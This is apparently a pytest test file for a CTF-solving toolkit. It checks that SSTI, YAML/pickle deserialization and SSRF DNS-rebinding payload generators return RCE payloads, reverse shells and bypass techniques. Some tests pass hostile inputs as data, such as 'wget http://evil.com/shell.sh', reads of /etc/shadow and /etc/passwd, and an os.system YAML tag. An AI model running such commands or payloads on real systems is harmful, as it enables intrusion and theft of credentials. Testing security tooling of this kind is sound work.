"""
Tests for v1.5.0 tool enhancements to existing tools.

Covers:
- SstiExploitSuggester: new engine support (hubspot_hubl, nunjucks, handlebars)
- DeserializationPayloadGenerator: new yaml_payloads operation,
  enhanced python_payloads with Advanced Pickle Techniques
- SsrfPayloadGenerator: new dns_rebinding operation
"""

import json
import pytest

from ctf_solver.tools.ssti_tools import SstiExploitSuggester
from ctf_solver.tools.deserialization_tools import DeserializationPayloadGenerator
from ctf_solver.tools.ssrf_tools import SsrfPayloadGenerator

# ==============================================================================
# SstiExploitSuggester - New Engine Tests
# ==============================================================================


class TestSstiExploitSuggesterNewEngines:
    """Tests for newly added engines in SstiExploitSuggester."""

    def setup_method(self):
        """Set up test fixtures."""
        self.tool = SstiExploitSuggester()

    # -- hubspot_hubl --------------------------------------------------------

    def test_hubspot_hubl_rce_payloads(self):
        """hubspot_hubl engine should return RCE payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "hubspot_hubl",
                }
            )
        )
        assert "HUBSPOT_HUBL" in result
        assert "RCE Payloads" in result
        assert "getRuntime" in result or "exec" in result

    def test_hubspot_hubl_with_custom_command(self):
        """hubspot_hubl should substitute the custom command in payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "hubspot_hubl",
                    "command": "cat /flag.txt",
                }
            )
        )
        assert "cat /flag.txt" in result

    def test_hubspot_hubl_info_payloads(self):
        """hubspot_hubl should include info disclosure payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "hubspot_hubl",
                }
            )
        )
        assert "Information Disclosure" in result or "info" in result.lower()
        assert "getClass" in result

    def test_hubspot_hubl_file_read(self):
        """hubspot_hubl should include file read payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "hubspot_hubl",
                    "file": "/etc/shadow",
                }
            )
        )
        assert "File Read" in result
        assert "/etc/shadow" in result

    # -- nunjucks ------------------------------------------------------------

    def test_nunjucks_rce_payloads(self):
        """nunjucks engine should return RCE payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "nunjucks",
                }
            )
        )
        assert "NUNJUCKS" in result
        assert "RCE Payloads" in result
        # Nunjucks payloads use child_process
        assert "child_process" in result

    def test_nunjucks_with_custom_command(self):
        """nunjucks should substitute the custom command in payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "nunjucks",
                    "command": "whoami",
                }
            )
        )
        assert "whoami" in result

    def test_nunjucks_info_payloads(self):
        """nunjucks should include info disclosure payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "nunjucks",
                }
            )
        )
        assert "Information Disclosure" in result
        assert "constructor" in result or "global" in result

    # -- handlebars ----------------------------------------------------------

    def test_handlebars_rce_payloads(self):
        """handlebars engine should return RCE payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "handlebars",
                }
            )
        )
        assert "HANDLEBARS" in result
        assert "RCE Payloads" in result
        assert "child_process" in result or "require" in result

    def test_handlebars_with_custom_command(self):
        """handlebars should substitute the custom command in payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "handlebars",
                    "command": "ls -la /",
                }
            )
        )
        assert "ls -la /" in result

    def test_handlebars_info_payloads(self):
        """handlebars should include info disclosure payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "handlebars",
                }
            )
        )
        assert "Information Disclosure" in result
        assert "this" in result

    # -- existing engines still work ----------------------------------------

    def test_jinja2_still_works(self):
        """Existing jinja2 engine should still return valid payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "jinja2",
                    "command": "id",
                }
            )
        )
        assert "JINJA2" in result
        assert "RCE Payloads" in result
        assert "__class__" in result

    def test_twig_still_works(self):
        """Existing twig engine should still return valid payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "twig",
                }
            )
        )
        assert "TWIG" in result
        assert "RCE Payloads" in result

    def test_erb_still_works(self):
        """Existing erb engine should still return valid payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "engine": "erb",
                }
            )
        )
        assert "ERB" in result
        assert "RCE Payloads" in result

    # -- error handling ------------------------------------------------------

    def test_missing_engine(self):
        """Omitting 'engine' should return an error listing supported engines."""
        result = self.tool.use(json.dumps({}))
        assert "Error" in result
        assert "engine" in result.lower()
        # Should list all engines including new ones
        assert "hubspot_hubl" in result
        assert "nunjucks" in result
        assert "handlebars" in result

    def test_unknown_engine(self):
        """An unknown engine should return an error."""
        result = self.tool.use(json.dumps({"engine": "django_templates"}))
        assert "Error" in result
        assert "Unknown engine" in result or "django_templates" in result

    def test_invalid_json(self):
        """Non-JSON input should return a JSON decoding error."""
        result = self.tool.use("not json!!!")
        assert "Error" in result
        assert "JSON" in result


# ==============================================================================
# DeserializationPayloadGenerator - YAML and Enhanced Python Tests
# ==============================================================================


class TestDeserializationPayloadGeneratorEnhancements:
    """Tests for yaml_payloads and enhanced python_payloads operations."""

    def setup_method(self):
        """Set up test fixtures."""
        self.tool = DeserializationPayloadGenerator()

    # -- yaml_payloads -------------------------------------------------------

    def test_yaml_payloads_returns_output(self):
        """yaml_payloads should return YAML deserialization payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                }
            )
        )
        assert "YAML Deserialization Payloads" in result

    def test_yaml_payloads_pyyaml_section(self):
        """yaml_payloads should contain PyYAML payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                }
            )
        )
        assert "PyYAML" in result
        assert "!!python/object/apply:os.system" in result

    def test_yaml_payloads_snakeyaml_section(self):
        """yaml_payloads should contain SnakeYAML (Java) payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                }
            )
        )
        assert "SnakeYAML" in result
        assert (
            "javax.script.ScriptEngineManager" in result
            or "java.lang.Runtime" in result
        )

    def test_yaml_payloads_ruby_section(self):
        """yaml_payloads should contain Ruby YAML payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                }
            )
        )
        assert "Ruby" in result
        assert "!ruby/object" in result

    def test_yaml_payloads_custom_command(self):
        """yaml_payloads should substitute the custom command."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                    "command": "cat /etc/passwd",
                }
            )
        )
        assert "cat /etc/passwd" in result

    def test_yaml_payloads_detection_section(self):
        """yaml_payloads should include detection indicators."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                }
            )
        )
        assert "Detection" in result or "detection" in result
        assert "application/x-yaml" in result or "text/yaml" in result

    def test_yaml_payloads_tips(self):
        """yaml_payloads should include usage tips."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "yaml_payloads",
                }
            )
        )
        assert "Tips" in result
        assert "SafeLoader" in result

    # -- python_payloads: Advanced Pickle Techniques -------------------------

    def test_python_payloads_advanced_pickle(self):
        """python_payloads should include 'Advanced Pickle Techniques' section."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "python_payloads",
                }
            )
        )
        assert "Advanced Pickle Techniques" in result

    def test_python_payloads_reverse_shell(self):
        """python_payloads should include reverse shell via pickle."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "python_payloads",
                }
            )
        )
        assert "Reverse Shell" in result or "reverse shell" in result.lower()
        assert "RevShell" in result or "socket" in result

    def test_python_payloads_subprocess_output(self):
        """python_payloads should include subprocess.check_output technique."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "python_payloads",
                }
            )
        )
        assert "subprocess.check_output" in result

    def test_python_payloads_handcrafted_opcodes(self):
        """python_payloads should include handcrafted pickle opcodes section."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "python_payloads",
                }
            )
        )
        assert (
            "Handcrafted" in result
            or "handcrafted" in result
            or "opcodes" in result.lower()
        )

    def test_python_payloads_eval_technique(self):
        """python_payloads should include eval-based pickle technique."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "python_payloads",
                }
            )
        )
        assert "eval" in result

    def test_python_payloads_custom_command(self):
        """python_payloads should substitute a custom command."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "python_payloads",
                    "command": "wget http://evil.com/shell.sh",
                }
            )
        )
        assert "wget http://evil.com/shell.sh" in result

    # -- yaml_payloads is in VALID_OPERATIONS --------------------------------

    def test_yaml_payloads_is_valid_operation(self):
        """yaml_payloads should be listed as a valid operation."""
        assert "yaml_payloads" in self.tool.VALID_OPERATIONS

    # -- error handling ------------------------------------------------------

    def test_missing_operation(self):
        """Omitting 'operation' should return an error listing valid ops."""
        result = self.tool.use(json.dumps({}))
        assert "Error" in result
        assert "operation" in result.lower()
        assert "yaml_payloads" in result

    def test_invalid_operation(self):
        """An unknown operation should return an error."""
        result = self.tool.use(json.dumps({"operation": "ruby_payloads"}))
        assert "Error" in result
        assert "ruby_payloads" in result

    def test_invalid_json(self):
        """Non-JSON input should return a JSON decoding error."""
        result = self.tool.use("bad json!!!")
        assert "Error" in result
        assert "JSON" in result

    # -- existing operations still work --------------------------------------

    def test_php_payloads_still_works(self):
        """php_payloads should still return valid PHP deserialization payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "php_payloads",
                }
            )
        )
        assert "PHP Deserialization" in result
        assert "__wakeup" in result

    def test_java_references_still_works(self):
        """java_references should still return Java deserialization refs."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "java_references",
                }
            )
        )
        assert "Java Deserialization" in result
        assert "ysoserial" in result

    def test_detection_tips_still_works(self):
        """detection_tips should still work."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "detection_tips",
                }
            )
        )
        assert "Detection Tips" in result
        assert "Magic Bytes" in result


# ==============================================================================
# SsrfPayloadGenerator - DNS Rebinding Tests
# ==============================================================================


class TestSsrfPayloadGeneratorDnsRebinding:
    """Tests for the new dns_rebinding operation in SsrfPayloadGenerator."""

    def setup_method(self):
        """Set up test fixtures."""
        self.tool = SsrfPayloadGenerator()

    # -- dns_rebinding is available ------------------------------------------

    def test_dns_rebinding_in_valid_operations(self):
        """dns_rebinding should be listed as a valid operation."""
        assert "dns_rebinding" in self.tool.VALID_OPERATIONS

    # -- dns_rebinding output ------------------------------------------------

    def test_dns_rebinding_returns_output(self):
        """dns_rebinding should return DNS rebinding payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "DNS Rebinding" in result

    def test_dns_rebinding_rbndr_service(self):
        """dns_rebinding should include rbndr.us service."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "rbndr.us" in result

    def test_dns_rebinding_nip_io(self):
        """dns_rebinding should include nip.io service."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "nip.io" in result

    def test_dns_rebinding_sslip_io(self):
        """dns_rebinding should include sslip.io service."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "sslip.io" in result

    def test_dns_rebinding_self_hosted_server(self):
        """dns_rebinding should include self-hosted DNS server code."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "Self-hosted" in result or "self-hosted" in result
        assert "RebindResolver" in result or "dnslib" in result

    def test_dns_rebinding_timing_section(self):
        """dns_rebinding should include timing-based DNS rebinding section."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "Timing" in result or "timing" in result
        assert "TTL" in result

    def test_dns_rebinding_bypass_protections(self):
        """dns_rebinding should include bypass protections section."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "Bypass" in result or "bypass" in result
        assert "TOCTOU" in result or "CNAME" in result

    def test_dns_rebinding_custom_target_ip(self):
        """dns_rebinding should use a custom target_ip."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                    "target_ip": "10.0.0.5",
                }
            )
        )
        assert "10.0.0.5" in result

    def test_dns_rebinding_default_ip(self):
        """dns_rebinding with default target_ip should use 127.0.0.1."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "127.0.0.1" in result

    def test_dns_rebinding_tips(self):
        """dns_rebinding should include tips section."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "Tips" in result

    def test_dns_rebinding_how_it_works(self):
        """dns_rebinding should explain the attack mechanism."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "dns_rebinding",
                }
            )
        )
        assert "How DNS Rebinding Works" in result
        assert "allowlist" in result.lower() or "Victim" in result

    # -- existing operations still work --------------------------------------

    def test_ip_bypass_still_works(self):
        """ip_bypass should still return valid IP obfuscation payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "ip_bypass",
                }
            )
        )
        assert "IP Bypass" in result
        assert "Decimal" in result
        assert "Hexadecimal" in result

    def test_cloud_metadata_still_works(self):
        """cloud_metadata should still return valid metadata payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "cloud_metadata",
                }
            )
        )
        assert "Cloud Metadata" in result
        assert "169.254.169.254" in result

    def test_protocol_smuggling_still_works(self):
        """protocol_smuggling should still return valid payloads."""
        result = self.tool.use(
            json.dumps(
                {
                    "operation": "protocol_smuggling",
                }
            )
        )
        assert "Protocol Smuggling" in result
        assert "gopher://" in result

    # -- error handling ------------------------------------------------------

    def test_missing_operation(self):
        """Omitting 'operation' should return an error listing valid ops."""
        result = self.tool.use(json.dumps({}))
        assert "Error" in result
        assert "operation" in result.lower()
        assert "dns_rebinding" in result

    def test_invalid_operation(self):
        """An unknown operation should return an error."""
        result = self.tool.use(json.dumps({"operation": "time_travel"}))
        assert "Error" in result
        assert "time_travel" in result

    def test_invalid_json(self):
        """Non-JSON input should return a JSON decoding error."""
        result = self.tool.use("bad json!!!")
        assert "Error" in result
        assert "JSON" in result
